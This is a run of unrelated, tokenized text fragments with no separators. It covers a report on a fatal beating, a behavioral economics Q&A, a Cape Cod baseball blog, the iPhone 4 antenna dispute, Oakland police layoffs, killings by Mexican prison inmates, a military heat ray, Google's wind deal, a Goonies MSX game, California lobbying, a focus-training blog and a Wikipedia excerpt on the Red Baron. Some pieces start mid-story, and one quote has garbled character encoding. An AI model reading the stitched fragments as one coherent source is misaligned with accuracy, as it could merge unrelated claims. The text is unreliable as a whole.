According to authorities , the attack was unprovoked and Mazaniego was rushed suddenly by a group of teens .
Crasto , who has put photos of Mazaniego up at the restaurant , said he has not seen the beating video , nor does he want to .
" I would just rather keep the memory I have of him with me , " he said .
1. ) What is behavioral economics ?
How is it different from standard economics ?
In general , both standard and behavioral economics are interested in the same questions and topics .
The choices people make , the effects on incentives , the role of information etc .
However , unlike standard economics , behavioral economics does not assume that people are rational .
Instead , behavioral economists start by figuring out how people actually behave , often in a controlled lab environment in which we can understand behavior better , and use this as a starting point for building our understanding of human nature .
As a consequence of this different starting point , behavioral economists usually come to different conclusions about the logic and efficacy of almost anything , ranging from mortgages to savings to healthcare in both the personal and business realms .
2. ) Even if consumers make mistakes from time to time , would n’t the market fix these ?
I always found the appeal to the market gods a bit odd .
Why would the market fix mistakes instead of aggravating them ?
When the Chicago economists sometimes ( reluctantly ) admits that people make mistakes , they claim that people make different types of mistakes that will eventually cancel each other out in the market .
Behavioral economics argues that , instead , people will often make the same mistake , and the individual mistakes can aggregate in the market .
Let ’s take the subprime mortgage crisis , which I think is a great example ( but a very sad reality ) of the market working to make the aggregation of mistakes worse .
It is not as if some people made one kind of mistake and others made another kind .
It was the fact that so many people made the same mistakes , and the market for these mistakes is what got us to where we are now .
3. ) Is n’t behavioral economics a depressing view of human nature ?
It is true that from a behavioral economics perspective we are fallible , easily confused , not that smart , and often irrational .
We are more like Homer Simpson than Superman .
So from this perspective it is rather depressing .
But at the same time there is also a silver lining .
There are free lunches !
Take the physical world for example .
We build products that work with our physical limitations .
Chairs , shoes , and cars are all designed to complement and enhance our physical capabilities .
If we take some of the same lessons we ’ve learned from working with our physical limitations and apply them to things that are affected by our cognitive limitations — insurance policies , retirement plans , and healthcare — we ’ll be able to design more effective policies and tools , that are more useful in the world .
This is the promise of behavioral economics – once we understand where we are weak or wrong we can try to fix it and build a better world .
Take again the sub - prime mortgage crisis .
Imagine that we understood how difficult it is for people to calculate the correct amount of mortgage that they should take , and instead of creating a calculator that told us the maximum that we can borrow , it helped us figure out what we should be borrowing .
I suspect that if we had this type of calculator ( and if people used it ) much of the sub - prime mortgage catastrophe could have been avoided .
This of course is one idea to fix one problem , and there are many ways to think about how to improve our lives along many of the decisions we make every day .
This is why I think that behavioral economics is so optimistic , useful , and important for our personal life and for society .

After a couple of days off , mostly due to computer malfunctions and a getaway to celebrate my 5th anniversary , The Rally Cap is back and should have posts regularly for the near future .
During the getaway to Cape Cod , my wife and I took in a Cape Cod Baseball League game .
This has become something of a tradition for us when we visit the Cape during the summer .
This past weekend we went to see the Yarmouth - Dennis Red Sox play the Chatham Anglers .
The first thing I noticed when I went to the game was that Chatham ’s team name had been changed .
I remembered them being the A’s ( like Oakland ’s team ) .
Turns out that in 2008 MLB enforced its trademarks on team names .
Prior to 2008 , there were teams named the Cardinals ( Orleans , now the Firebirds ) , Mets ( Hyannis , now the Harbor Hawks ) , A’s ( Chatham ) , Red Sox ( Yarmouth - Dennis ) , Bourne ( Braves ) , and Harwich ( Mariners ) .
Half of the teams with names associated with Major League clubs chose to change their names due to the constrictive policy MLB was enforcing .
This action by MLB is ridiculous .
The Cape league , as cited in the article link above , has an operating budget of $ 300,000 per year .
It ’s not like it is big business making a ton of money off of trademarks owned by MLB .
My guess is that most of the revenue from merchandise sales goes back into running the Cape League .
It is shocking to me is that MLB , which provides financial support to the league , would deliver an ultimatum to the Cape League teams forcing them to do things MLB ’s way or break tradition and change names .
As one of the few wooden bat leagues in the country , the Cape League , which has been around since 1885 , allows top college players to compete in situations that are similar to what they will face in the minors and in the big leagues .
The league is seen as one of the proving grounds for the best college players and gives teams a chance to scout players when they are n’t hitting with or pitching against an aluminum bat .
Evidence of the league ’s success is that in 2009 there were 217 alumni in the majors , including Tim Lincecum , Evan Longoria , Chase Utley and Kevin Youkilis .
The league is an important part of baseball ’s set up and MLB should be trying to help the league rather than hurt it .
Rant aside , I love Cape League games .
The Cape League is a little slice of Americana .
College baseball players staying with local residents while they play the nation ’s pastime on high school fields .
Ca n’t get more American than that .
The Cape League players are the definition of the Boys of Summer .
Going to the games is fun because the players become part of the community , and the communities on the Cape embrace their local teams .
Some of the games are so well attended that they might rival Marlins games .
I ca n’t think of a better way to spend a lazy summer day on the Cape than going to the beach and then heading to the ball field to see what is the equivalent of Single A minor league baseball .
I enjoy watching potential stars play against other top flight competition .
I also find the chance to speak with scouts from MLB teams interesting .
Though most would n’t tell me what teams they worked for , it was still exciting .
The game itself was a pitchers ’ duel .
Yarmouth - Dennis’ Tommy Toledo , a righty from the University of Florida , had his second good start of the season , giving up just 2 runs .
Chatham ’s starter , Derek Self out of the University of Louisville , also gave up just 2 runs .
The Sox had the better of the offense throughout the night , racking up 12 hits to the Anglers ’ 6 and were able to get at the Anglers ’ bullpen to score 2 more runs and secure the 4 - 2 victory .
The experience was thoroughly enjoyable and I look forward to seeing more games in the future .
It will be interesting to revisit this post in a few years to see if any of the players have made a mark in the majors .
Samsung Electronics on Sunday fired back at Apple ’s claims that other smartphones have reception problems as well .
Apple CEO
Steve Jobs on Friday argued that not only its iPhone 4G , but other phones experience a signal loss when grabbed in a certain way , showing video of iPhone ’s rival phones -- Research In Motion Ltd. ’s BlackBerry Bold , HTC Corp.’s Droid Eris and Samsung Electronics Co. ’s Omnia II .
Apple Inc.'s iPhone 4 and a rubberized protective case called a Bumper , are held for a photo in Aspen , Colorado , U.S. , on Friday , July 16 , 2010 .
Apple Inc. Chief Executive Officer Steve Jobs says the company knew that the iPhone 4 can lose reception when held a certain way and did n't think it would be a big issue .
He offered customers a case to fix the antenna flaw .
( Bloomberg )
Jobs ’ news conference sparked backlash from Apple competitors , some of which accused Apple of trying to divert consumer attention from its biggest ever public relations crisis .
Samsung said that the antennas of its smartphones were designed to make sure that they have no difficulty in getting signals .
The world ’s No. 2 handset maker also said that no reception issues have been reported so far about its smartphones .
“ The antenna is located at the bottom of the Omnia 2 phone , while iPhone ’s antenna is on the lower left side of the device .
Our design keeps the distance between a hand and an antenna , ” Shin Young - joon , a Samsung spokesperson , told The Korea Herald .
“ We have fully conducted field tests before the rollout of smartphones .
Reception problems have not happened so far , and there is no room for such problems to happen in the future , ” he said .
He also questioned the reliability of the reception test made by Apple , saying its results may differ depending on the circumstance .
Samsung , however , fell short of releasing a statement on Apple ’s latest claims unlike Nokia , Research In Motion , and Motorola .
This is possibly because Apple is one of the biggest customers for Samsung , the world ’s No. 1 memory chip maker .
The popular iPhone 4 uses Samsung ’s DRAM and NAND flash memory chips , and an application processor manufactured by the Korean chip vendor .
RIM , the world ’s No.2 smartphone maker which faces a growing threat from third - ranked Apple , strongly criticized Jobs ’ comments .
“ Apple ’s attempt to draw RIM into Apple ’s self - made debacle is unacceptable .
Apple ’s claims about RIM products appear to be deliberate attempts to distort the public ’s understanding of an antenna design issue and to deflect attention from Apple ’s difficult situation , ” RIM co-CEOs Jim Balsillie and Mike Lazaridis said in a statement .

Steve Jobs talks about the Apple iPhone 4 at Apple headquarters in Cupertino , California on Friday .

I would change Lab Disaster with Lab Accident and use the origin of the Flash .
I would also love some of the non-specific ones to have a more comics related image like Dr Fate / Strange for the learn magic , " Born a mutant " could be a bit more NightCrawler , and cosmic rays could have all four powers .
. .
Also I think the Green Lantern origin or Quasar / Captain Marvel would be similar to " Find Mjolnir " - so maybe its " Find object of power ! "
Definitely could have " be an alien " added .
How about " a deal with the devil " - Ghost Rider / Blue Devil ?
Or " have a ' super ' parent " - Invincible ?
Or " Gift from the gods " - Shazam / WonderWoman ?
Maybe just add a new row ?
This is fun !

The Oakland Police Department is feeling the burn of California ’s unending budget crisis , as 80 officers were laid off Tuesday night after negotiations between city and police union failed to reach an accord .
The department ’s chief had said in recent days that unless the city could meet the union ’s demands , officers would no longer respond in person to register sex offenders , or for reports of vehicle accidents , grand theft , identity theft , burglary , embezzlement , vandalism , stray animals and others .
ADVERTISEMENT
Instead , victims in most non-emergency situations are being directed to file reports over the Internet .
Police say the move will help them better focus on emergencies and violent crime .
In Oakland , one of the nation ’s most crime - plagued cities , non-violent reports make up about a quarter of 911 calls , according to area reports .
The 80 officers laid off constitute about 10 percent of the police department ’s total manpower .
Tuesday ’s layoffs complete an action taken by the city council , which voted on June 25 to axe the jobs .
If the city ’s voters refuse this November to approve new taxes , another 122 Oakland officers will be out of a job by January 1 , 2011 .
Union and city officials had been in talks to save the jobs by requiring police to contribute 9 percent of their paychecks to pension funds : something already required of other city employees .
The police union balked and demanded Oakland ensure that if they agreed , no officers would be laid off for another three years .
The city could not make such a promise , so the impasse grew .
“ In a press conference tonight Brunner said the city Ã¢â‚¬â „ ¢s final offer was to allow police union members to pay 4 % of their pension now and an additional 3 % come July 1 , 2011 , ” California Beat reported .
“ Because the union had already agreed to pay 2 % beginning January 2013 , officers would have contributed the 9 % the city sought , Brunner said .
ADVERTISEMENT
“ But representatives [ still ] held out for the three - year layoff moratorium . ”
The Associated Press added : “ Police Chief Anthony Batts said many of the officers laid off were on the front lines last week , trying to control protesters after former Bay Area Rapid Transit officer Johannes Mehserle was convicted of involuntary manslaughter in the shooting of an unarmed black man in 2009 . ”
A police union official told California Beat they will move forward by lobbying the city to reinstate the fired officers ’ jobs .

Layoffs leave the Oakland Police Department with just under 700 officers to enforce laws in a city of nearly 400,000 .
Guards and officials at a prison in northern Mexico allegedly let inmates out , lent them guns and allowed them to use official vehicles to carry out drug - related killings , including the massacre of 17 people last week , prosecutors said Sunday .
After carrying out the killings the inmates would return to their cells , the Attorney General ’s Office said in a revelation that was shocking even for a country wearied by years of drug violence and corruption .
ADVERTISEMENT
“ According to witnesses , the inmates were allowed to leave with authorization of the prison director … to carry out instructions for revenge attacks using official vehicles and using guards ’ weapons for executions , ” office spokesman Ricardo Najera said at a news conference .
The director of the prison in Gomez Palacio in Durango state and three other officials were placed under a form of house arrest pending further investigation .
No charges have yet been filed .
Prosecutors said the prison - based hit squad is suspected in three mass shootings , including the July 18 attack on a party in the city of Torreon , which is near Gomez Palacio .
In that incident , gunmen fired indiscriminately into a crowd of mainly young people in a rented hall , killing 17 people , including women .
Police found more than 120 bullet casings at the scene , and Najera said tests matched those casings to four assault rifles assigned to guards at the prison .
Similar ballistics tests linked the guns to earlier killings at two bars in Torreon , the capital of northern Coahuila state , he said .
At least 16 people were killed in those attacks on Feb. 1 and May 15 , local media reported .
ADVERTISEMENT
Najera blamed the killings on disputes between rival drug cartels .
“ Unfortunately , the criminals also carried out cowardly killings of innocent civilians , only to return to their cells , ” he said .
Coahuila and neighboring Durango are among several northern states that have seen a spike in drug - related violence that authorities attribute to a fight between the Gulf cartel and its former enforcers , known as the Zetas .
Mexico has long had a problem with investigating crimes , catching criminals and convicting people .
Reports estimate less than 2 percent of crimes in Mexico result in prison sentences .
But Sunday ’s revelation suggests that even putting cartel gunmen in prison may not prevent them from continuing to commit crimes .
ADVERTISEMENT
Interior Secretary Francisco
Blake said the revelation “ can only be seen as a wake - up call for authorities to address , once again , the state of deterioration in many local law enforcement institutions … we cannot allow this kind of thing to happen again . ”
Also Sunday , Mexican federal police announced the arrest of an alleged leading member of a drug gang blamed in recent killings and a car - bombing in the violence - ridden border city of Ciudad Juarez , across from El Paso , Texas .
ADVERTISEMENT
Police described Luis Vazquez Barragan , 39 , as a top member of La Linea gang , the enforcement arm of the Juarez cartel , saying he received orders directly from cartel boss Vicente Carrillo Fuentes .
Vazquez Barragan allegedly organized payments , moved drugs and oversaw a system of safe houses in and around Ciudad Juarez .
Police said he held the same rank as fugitive gang leader Juan Pablo Ledezma , though Vazquez Barragan is not named on reward or most - wanted lists published by the Attorney General ’s Office , as Ledezma is .
ADVERTISEMENT
La Linea has been blamed for a car bomb that killed three people July 15 in Ciudad Juarez and for two separate shootings March 13 that killed a U.S. consular employee and two other people connected to the consulate .
Police did not say when they caught Vazquez Barragan , but he was allegedly in possession of about a half - kilogram ( pound ) of cocaine and two guns .
His arrest led to a raid on a safe house where authorities detained four suspects and freed a kidnap victim .
Also Sunday , the Attorney General ’s Office said soldiers on patrol in Ciudad Madero in the border state of Tamaulipas seized an arsenal of about three dozen guns , 17 grenades and thousands of bullets in a house .
ADVERTISEMENT
Elsewhere in Tamaulipas , police and prosecutors raided a lot full of truck - pulled tankers in the border city of Reynosa and seized two loaded with oil of a type sometimes stolen from the pipelines of the state - owned Petroleos Mexicanos .
Nore than a dozen other tankers and freight containers were also seized .
Mexican drug cartels have allegedly become involved in increasingly sophisticated thefts of fuel and oil from Mexico ’s pipelines .
In the Pacific coast state of Guerrero , authorities reported Sunday they had found the bullet - ridden bodies of six men dumped in various locations , including three in or around the resort of Acapulco .
Two of the dead men were identified as people kidnapped earlier in the month .

A newly - developed heat ray gun that burns the skin but does n't cause permanent injury is now with US troops in Afghanistan .
The Active Denial System ( ADS ) is a non-lethal weapon designed to disperse violent crowds and repel enemies .
It uses a focused invisible beam that causes an " intolerable heating sensation " , but only penetrates the skin to the equivalent of three sheets of paper .
The discomfort causes whoever it 's pointed at to immediately start moving away .
They often scream but the US military says the chance of injury from the system is 0.1 % .
It 's already been tested more than 11,000 times on around 700 volunteers .
Even reporters have faced the heat - ray .
Limit deaths
Lt. Col. John Dorrian , a US military spokesperson , says the kit is now in Afghanistan but no decision has yet been made on its use .
There 's been much talk about the need to keep civilian casualties in Afghanistan to a minimum .
The heat ray gun could help .
The beam produced by the ADS can travel more than 500 m ( 1,640 ft ) and is seen as an important new way to limit unnecessary deaths and minimise war zone casualties .
Developers also say it could also be adapted to other operations , like fighting drug smuggling at sea and general peacekeeping operations .
Research is continuing to make the system smaller , lighter and less expensive , says the Pentagon 's Joint Non-Lethal Weapons Program .
Google has been speaking about their commitment to be a cleaner , greener company since they announced their commitment to become a carbon neutral enterprise back in 2007 .
Now , they have made a new green energy deal that could help give wind power the boost that it needs not only to keep Google green but to help the US finally break its deadly fossil fuel addiction .
Google announced last week , that it has signed a 20 year deal with the alternative energy company NextEra Energy .
The deal is being carried out by Google 's energy division which was formed at the end of last year to allow the search giant to directly purchase energy from the wholesale market .
They will purchase 114 megawatts of energy from NextEra Energy over the next 20 years .
Google Energy will not use the wind energy directly but will instead sell it back to the main grid , increasing the amount of safe and clean energy on the market .
The proceeds from that sale will then be used by Google to buy Renewable Energy Credits to help offset their own carbon footprint .
They will begin purchasing from the wind farm on July 30th .
The energy that NextEra is providing to Google will come from a wind turbine farm in Iowa .
This deal with Google will help to protect the future for wind energy and NextEra Energy and Google hope that it will give incentives to major energy buyers to buy from the renewable sources instead of more dangerous and polluting sources of energy such as coal and gas .
This wind energy deal is not the only investment that Google has made into the world of green energy .
Other investments by the search mega giant has included an electric cars program known as RechargeIt and a multi-million dollar investment in geothermal technology which is aiming to harvest energy from deep beneath the earth 's surface .
Of course , this move is not just about going green .
With a long term deal in place now , Google has secured the energy it will need in the future even as demand for renewable energy increases and likewise , they have locked in a lower price now so if the energy costs rise over the next two decades , Google will still be paying the same low rate so the Next Era Energy deal is not only good for the environment but it is good for business as well .

Spanish homebrew team Kralizec has delivered an awesome gift to gamers looking for a special way to celebrate the 25th anniversary of The Goonies release to theaters this year : a new MSX game based on the movie !
The release is titled The Goonies ' R' Good Enough , named after the series ' theme track sung by Cyndi Lauper .
This title is n't based on Konami's The Goonies MSX game released in 1986 or on Brain Games ' PC remake of that title released in 2006 .
This four - year project is an original title that is meant to more closely follow the movie 's plot , even offering digitized images from the film .
Kralizec is selling this fan production as a 4MB megarom cartridge that includes two versions , one for MSX and the other for MSX2 ( with " special extra stuff " if you 're using a MSX2 + or MSXtR ) .
You can watch the MSX2 edition above , while a video for the MSX version is embedded after the break .
You can buy a copy of The Goonies ' R' Good Enough through MSX Cartridge Shop .
The game comes boxed and shrinkwrapped , and includes a 16 - page color manual .
Expect to pay € 35 , or $ 45 , before shipping / handling .

Sponsor introduced bills become laws in California more often than legislator introduced bills undermining democracy
July 13 , 2010
Lawmakers give away citizens ’ money , water , and air to the corporations and lobbyists who pay for them to get elected .
In a democracy laws are to be written by legislators elected into office not interest groups who bankroll their election campaigns .
In a special two - part report : " Sponsored Bills in Sacramento " published by the SJ Mercury News on Sunday , reporter Karen de Sá uncovered a disturbing lawmaking practice that is commonplace in Sacramento in her article , “ How our laws are really made . ”
“ A Mercury News analysis found that in 2007 - 08 , the most recent complete two - year legislative session , more than 1,800 bills — about 39 percent of the total — were sponsored by outside interests .
And those sponsored bills made up 60 percent of the legislation that was passed into law . ”
“ Lawmakers should be required to wear NASCAR - style logos of the companies that fund their election campaigns and write their laws so voters know who is getting elected into office along with them , " said Daniel Newman , executive director of Bay Area nonpartisan research group , MAPLight.org .
In California legislators raised almost four out of every five dollars in campaign funds from outside of where their constituents live , according to a MAPLight.org report titled , “ Remote Control : California state lawmakers raise 79 % of campaign funds from outside their districts . ”
Funding of California lawmakers ’ campaigns is dominated by business groups according to a recent MAPLight.org study titled , “ Investing in Influence . ”
Researchers found that businesses and trade associations paid for 40 percent of California legislators ’ campaigns over the last three years .
" Democracy will continue to be undermined if the voices of ordinary citizens cannot be heard above the roar of the interests of corporations and lobbyists who finance the election campaigns of our politicians , " said Newman .
" In its current state we have the best government money can buy . "

There 's some truth to it .
Posts like this and search trends point to what we 're after .
Many people want the ability to focus more and feel like they 're losing the ability to focus on a particular task for long periods of time .
We feel like we 're losing that ability .
Getting Things
Done and all the other books out there tend to give you some rituals to cope with the problem — but only if you could stick to them .
Most of us , just a few weeks after reading that book , sit next to filing cabinets ( virtual or otherwise ) and go about our merry way .
That 's because we 're focused on the wrong thing .
To get a longer attention span — even a span long enough to read this article — do n't worry about managing the information .
Worry about managing your attention .
Paying attention , for long periods of time , is a form of endurance athleticism .
Like running a marathon , it requires practice and training to get the most out of it .
It is as much Twitter 's fault that you have a short attention span as it is your closet 's fault it does n't have any running shoes in it .
If you want the ability to focus on things for a long period of time , you need attention fitness .

Neuroplasticity is how your brain changes its organization over time to deal with new experiences .
It involves physical changes inside of the brain based on the particular tasks the brain is asked to complete .
It 's why the hippocampus of a seasoned taxi driver in London is larger than average , and how a meditating monk grows grey matter .
Your brain is n't a mythological deity but a physical part of your body that needs to be taken care of just like the rest of your body .
And your body responds to two things really well — diet and exercise .
Let 's presume your brain , being a part of the body , also does .
Things like Inbox Zero or cutting down on meetings may be handy tricks , but they do n't take neuroplasticity into account .
The bet there is that you have a finite amount of attention to spend , and that attention range is n't changeable .
That stuff is handy for making the best use of your limited attention span , but it 's not going to improve your attention span .
It 's not going to stop your brain from being easily distracted or unfocused if you 've already trained it to be that way .
So how do you train to focus ?
I 've been using interval training with great success .
Modeled after how I trained to run my first marathon using Jeff Galloway 's technique , I practice attention interval training .
I got this timer installed on my computer .
It 's an excellent interval timer based on a technique called the Pomodoro technique — but I 'm primarily using it based on its ability to make sound , set good intervals , and support logging .
I started small : 10 minutes of work with two minute breaks .
My strategy has been to keep it so when the timer goes off that tells me it's time to take a break , I feel like I can keep going .
I 'm up to 35 minutes now with 2 minute breaks .
Interestingly enough — this is about as far as I 'll get probably while still being able to keep Instant Messaging on .
I 've found that about 35 minutes is the max response time for IM to be useful .
The timer is n't the key part though , that 's just a component of a system like a good watch is a part of running a marathon .
Here 's how I set that up :
Ditched the Second Monitor
I 've been using a second monitor for nearly ten years , thinking that vast amounts of space were key to productivity .
The second monitor myth has been around for quite some time .
Yet the only actual scientific study I could find linking multiple monitors to productivity was done in 2003 by a monitor manufacturer , a video card manufacturer , and the University of Utah .
It 's actually kind of a marketing document , not a study .
I 've opted for one , large monitor .
Two monitors just allows me to put distractions on one monitor , and actual work on another .

Set up Spaces in OS X
Spaces is virtual desktop software on OS X .
I never thought it was useful before ditching the second monitor , but now — instead of having always - on distraction in one monitor on my desk , I can put my email , twitter , and surfing browser in one " Space " on OS X and keep it there .
When I start my pomodoro timer , I hop into a " space " that looks more like this — only the tools I need to do whatever task I am up for on the screen .
In this case , I need limited web browsing and a text editor to write this blog post .
Note the addition of " about : blank " in my bookmark bar at the top of the browser .
While I 'm writing and do n't need to use the browser , I tend to blank the screen out so I do n't get too distracted by the browser .

My third space simply has Remember the Milk running in full screen .
Ed. note :
If you 're not running OS X , take a look at these popular virtual desktops for alternatives to Spaces .

Turned the mouse off during work - time
During the time that I 'm working ( unless I 'm editing ) — my 35 minute work intervals — I turn my mouse off .
I 've found that I can focus much more on the task at hand if I do n't touch or use that mouse .
For me , my mouse is a gateway towards passive browsing and web surfing .
If I do n't have access to it , I can't begin the chain reaction of getting sucked into the web .
For me , it'd be like running a marathon on a road with 26.2 miles of chicken - wing stores .
I might make it a few miles , sure , but around mile 20 , I 'm going to succumb to temptation .
I 've found that Divvy helps me manage windows without the mouse , and that Vimium helps me use the web for research without the mouse .
Advertisement
Created a proactive routine
Part of my 2 minute break - time is used to set - up whatever tools I need to accomplish my next task .
I use that time to figure out exactly what I need for my next task , close - down all the things I do n't need for that task , and set windows up appropriately .
There 's rarely a time when I need more than two windows open .
My workspace , whether it be writing code or writing blog posts , more often than not , looks like this .
The set - up generally involves closing all tabs in the browser , and starting the browser fresh with an about : blank page .
The key here is , I do n't just hop into doing work .
I spend a minute or two setting up an ideal environment for me to be able to complete whatever my next task is .
When I leave my computer for the day , there are no windows open .
I start with a blank slate to come back to .
No need getting bogged down in yesterday 's set - up .
Advertisement
About those tabs
None of my web browsers — surfing or otherwise , are allowed to have more than 5 tabs per browser window at any time .
I do this via the No More Tabs Chrome extension .
This extension is pretty brutal : if you create a new tab and you 're over your tab limit ( defaults to 5 ) it 'll close your oldest one .
I 've been running this extension for over a month , and not once have I had a serious problem .
It 's forced me to pay attention to a particular web page and finish working with it if I 'm going to move on to something else .
Advertisement
The Environment Around Me
While I work primarily from home , I 'm still prone to distractions from my environment .
To conquer that , I have a pair of noise - reducing headphones , and I listen primarily to lyric - free music .
Just a bit of noise to keep me focused .
I sit at my desk , but I suspect that I 'll be converting to a standing desk soon because I do n't want to die early .
I also tend to keep some snacks ( nuts ) and beverages around my desk so that food and water do n't lower my focus threshold .
Though there 's one big anomaly here : I 'm not working in an office with that many people in it .
I do n't have a lot of meetings to take .
I 'm not managing anyone right now .
For that though , I suggest consolidating all meetings into the afternoon and make them back to back .
That way , you 're getting them out of the way and you have solid , long blocks of time to focus on getting things done .

Synopsis
Like all exercise , different kinds of workouts work differently for different people .
For me , interval training works wonders — this blog post , for instance , has taken me 70 minutes to research and write — ordinarily a blog post like this before I had this set - up would take me nearly a full day 's worth of work .
More importantly though , I 'm able to do things like read long articles or even academic papers — things I never used to " have time for " which really meant " had attention for . "
Advertisement
If you think you 're having focus problems — if the concept of provigil appeals to you , or you 've thought " oh if I could only get my hands on some ritalin , " think about setting up an attention fitness regimen for yourself instead .
My general advice :
Do slightly less than you think you 're capable of Increase your capacity while staying under that bar ( #1 ) You 're not going to run the attention fitness equivalent of a marathon today .
Start slow .

Your brain , like your body , is only a result of what you train it to do .
Attention fitness , like any other kind of fitness , takes time even to get into a routine .
But once you make it a habit , it starts to pay off .

This article is about the WWI flying ace .
For other people with the same name , see Manfred von Richthofen ( disambiguation )
German WWI flying ace AKA " Red Baron "
Manfred Albrecht Freiherr von Richthofen ( German : [ ˈmanfreːt fɔn ˈʁɪçthoːfn̩ ] ; 2 May 1892 – 21 April 1918 ) , known in English as Baron von Richthofen , and most famously as the " Red Baron " , was a fighter pilot with the German Air Force during World War I .
He is considered the ace - of - aces of the war , being officially credited with 80 air combat victories .
Originally a cavalryman , Richthofen transferred to the Air Service in 1915 , becoming one of the first members of fighter squadron Jagdstaffel 2 in 1916 .
He quickly distinguished himself as a fighter pilot , and during 1917 became leader of Jasta 11 and then the larger fighter wing unit Jagdgeschwader 1 , better known as " The Flying Circus " or " Richthofen 's Circus " because of the bright colours of its aircraft , and perhaps also because of the way the unit was transferred from one area of Allied air activity to another – moving like a travelling circus , and frequently setting up in tents on improvised airfields .
By 1918 , Richthofen was regarded as a national hero in Germany , and respected by his enemies .
Richthofen was shot down and killed near Vaux - sur - Somme on 21 April 1918 .
There has been considerable discussion and debate regarding aspects of his career , especially the circumstances of his death .
He remains one of the most widely known fighter pilots of all time , and has been the subject of many books , films and other media .
Name and nicknames [ edit ]
Richthofen was a Freiherr ( literally " Free Lord " ) , a title of nobility often translated as " baron " . [ 1] [ 2 ]
This is not a given name nor strictly a hereditary title , since all male members of the family were entitled to it , even during the lifetime of their father . [ a ]
Richthofen painted his aircraft red , and this combined with his title led to him being called " The Red Baron " ( ( help·info ) ) , both inside and outside Germany .
[ 1 ]
During his lifetime , he was more frequently described in German as Der Rote Kampfflieger , variously translated as " The Red Battle Flyer " or " The Red Fighter Pilot " .
This name was used as the title of Richthofen 's 1917 autobiography . [ 3 ]
Early life [ edit ]
Richthofen was born in Kleinburg , near Breslau , Lower Silesia ( now part of the city of Wrocław , Poland ) , on 2 May 1892 into a prominent Prussian aristocratic family .
His father was Major Albrecht Philipp Karl Julius Freiherr von Richthofen and his mother was Kunigunde von Schickfuss und Neudorff . [ 4 ]
He had an elder sister , Ilse , and two younger brothers .
When he was four years old , Manfred moved with his family to nearby Schweidnitz ( now Świdnica , Poland ) .
He enjoyed riding horses and hunting as well as gymnastics at school .
He excelled at parallel bars and won a number of awards at school .
[ 5 ]
He and his brothers , Lothar and Bolko , [ 6 ] [ b ] hunted wild boar , elk , birds , and deer . [ 7 ]
After being educated at home he attended a school at Schweidnitz before beginning military training when he was 11 . [ 8 ]
After completing cadet training in 1911 , he joined an Uhlan cavalry unit , the Ulanen - Regiment Kaiser Alexander der III .
von Russland ( 1. Westpreußisches ) Nr. 1 ( " 1st Emperor Alexander III of Russia Uhlan Regiment ( 1st West Prussian ) " ) and was assigned to the regiment 's 3 . Eskadron ( " No. 3 Squadron " ) . [ 9 ]
Early war service [ edit ]
When World War I began , Richthofen served as a cavalry reconnaissance officer on both the Eastern and Western Fronts , seeing action in Russia , France , and Belgium ; with the advent of trench warfare , which made traditional cavalry operations outdated and inefficient , Richthofen 's regiment was dismounted , serving as dispatch runners and field telephone operators . [ 10 ]
Disappointed and bored at not being able to directly participate in combat , the last straw for Richthofen was an order to transfer to the army 's supply branch .
His interest in the Air Service had been aroused by his examination of a German military aircraft behind the lines , [ 11 ] and he applied for a transfer to Die Fliegertruppen des deutschen Kaiserreiches ( Imperial German Army Air Service ) , later to be known as the Luftstreitkräfte .
He was falsely reported to have written in his application for transfer , " I have not gone to war in order to collect cheese and eggs , but for another purpose . " [ 12 ]
His request was granted , [ 11 ] and Manfred joined the flying service at the end of May 1915 . [ 13 ]
From June to August 1915 , Richthofen served as an observer on reconnaissance missions over the Eastern Front with Feldflieger Abteilung 69 ( " No. 69 Flying Squadron " ) . [ 11 ]
In August 1915 , he was transferred to a flying unit in Ostend , a coastal city in Belgium . [ 14 ]
There he flew with friend and fellow pilot Georg Zeumer , who would later teach him to fly solo . [ 15 ]
On being transferred to the Champagne front , he is believed to have shot down an attacking French Farman aircraft with his observer 's machine gun in a tense battle over French lines ; [ 16 ] he was not credited with the kill , since it fell behind Allied lines and therefore could not be confirmed .
Piloting career [ edit ]
" I had been told the name of the place to which we were to fly and I was to direct the pilot .
At first we flew straight ahead , then the pilot turned to the right , then left .
I had lost all sense of direction over our own aerodrome !
... I did n't care a bit where I was , and when the pilot thought it was time to go down , I was disappointed .
Already I was counting down the hours to the time we could start again . "
John Simpson , quoting Richthofen 's own description of his first flying experience . [ 17 ]
Manfred von Richthofen had a chance meeting with German ace fighter pilot Oswald Boelcke [ 18 ] which led him to enter training as a pilot in October 1915 . [ 18 ]
In February 1916 , Manfred " rescued " his brother Lothar from the boredom of training new troops in Luben and encouraged him to transfer to the Fliegertruppe . [ 19 ]
The following month , Manfred joined Kampfgeschwader 2 ( " No. 2 Bomber Squadron " ) flying a two - seater Albatros C.III .
Initially , he appeared to be a below - average pilot .
He struggled to control his aircraft , and he crashed during his first flight at the controls . [ 18 ]
Despite this poor start , he rapidly became attuned to his aircraft .
He was over Verdun on 26 April 1916 and fired on a French Nieuport , shooting it down over Fort Douaumont [ 18 ] — although he received no official credit .
A week later , he decided to ignore more experienced pilots ' advice against flying through a thunderstorm .
He later noted that he had been " lucky to get through the weather " and vowed never again to fly in such conditions unless ordered to do so . [ 20 ]
Richthofen met Oswald Boelcke again in August 1916 , after another spell flying two - seaters on the Eastern Front .
Boelcke was visiting the east in search of candidates for his newly formed Jasta 2 , and he selected Richthofen to join this unit , one of the first German fighter squadrons . [ 21 ]
Boelcke was killed during a midair collision with a friendly aircraft on 28 October 1916 , and Richthofen witnessed the event . [ 21 ]
Richthofen scored his first confirmed aerial victory in the skies over Cambrai , France , on 17 September 1916 . [ 22 ]
His autobiography states , " I honoured the fallen enemy by placing a stone on his beautiful grave . " [ 23 ]
He contacted a jeweller in Berlin and ordered a silver cup engraved with the date and the type of enemy aircraft . [ c ]
He continued to celebrate each of his victories in the same manner until he had 60 cups , by which time the dwindling supply of silver in blockaded Germany meant that silver cups could no longer be supplied .
Richthofen discontinued his orders at this stage , rather than accept cups made from base metal . [ d ]
His brother Lothar ( 40 victories ) used risky , aggressive tactics , but Manfred observed a set of maxims known as the " Dicta Boelcke " to assure success for both the squadron and its pilots . [ 24 ]
He was not a spectacular or aerobatic pilot like his brother or Werner Voss ; however , he was a noted tactician and squadron leader and a fine marksman .
Typically , he would dive from above to attack with the advantage of the sun behind him , with other pilots of his squadron covering his rear and flanks .
Major Lanoe Hawker VC
On 23 November 1916 , Richthofen shot down his most famous adversary , British ace Major Lanoe Hawker VC , described by Richthofen as " the British Boelcke " . [ 25 ]
The victory came while Richthofen was flying an Albatros D.II and Hawker was flying the older DH.2 .
After a long dogfight , Hawker was shot in the back of the head as he attempted to escape back to his own lines . [ 26 ]
After this combat , Richthofen was convinced that he needed a fighter aircraft with more agility , even with a loss of speed .
